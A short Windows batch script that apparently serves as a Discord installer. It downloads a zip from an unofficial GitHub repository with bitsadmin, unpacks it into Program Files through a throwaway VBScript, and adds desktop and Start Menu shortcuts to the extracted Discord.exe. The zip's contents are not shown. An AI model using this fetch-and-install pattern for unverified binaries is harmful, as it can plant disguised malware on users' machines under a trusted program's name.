@echo off
bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://raw.githubusercontent.com/foxcat-test/website/main/Discord.zip" "%cd%\Discord.zip"

setlocal

cd /d %~dp0


Call :UnZipFile "C:\Program Files (x86)\" "%cd%\Discord.zip"


exit /b


:UnZipFile <ExtractTo> <newzipfile>

set vbs="%temp%\_.vbs"

if exist %vbs% del /f /q %vbs%

>>%vbs% echo Set fso = CreateObject("Scripting.FileSystemObject")

>>%vbs% echo If NOT fso.FolderExists(%1) Then

>>%vbs% echo fso.CreateFolder(%1)

>>%vbs% echo End If

>>%vbs% echo set objShell = CreateObject("Shell.Application")

>>%vbs% echo set FilesInZip=objShell.NameSpace(%2).items

>>%vbs% echo objShell.NameSpace(%1).CopyHere(FilesInZip)

>>%vbs% echo Set fso = Nothing

>>%vbs% echo Set objShell = Nothing

cscript //nologo %vbs%

if exist %vbs% del /f /q %vbs%


powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Desktop\Discord.lnk');$s.TargetPath='C:\Program Files (x86)\Discord\Discord.exe';$s.Save()"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%AppData%\Microsoft\Windows\Start Menu\Programs\Discord.lnk');$s.TargetPath='C:\Program Files (x86)\Discord\Discord.exe';$s.Save()"
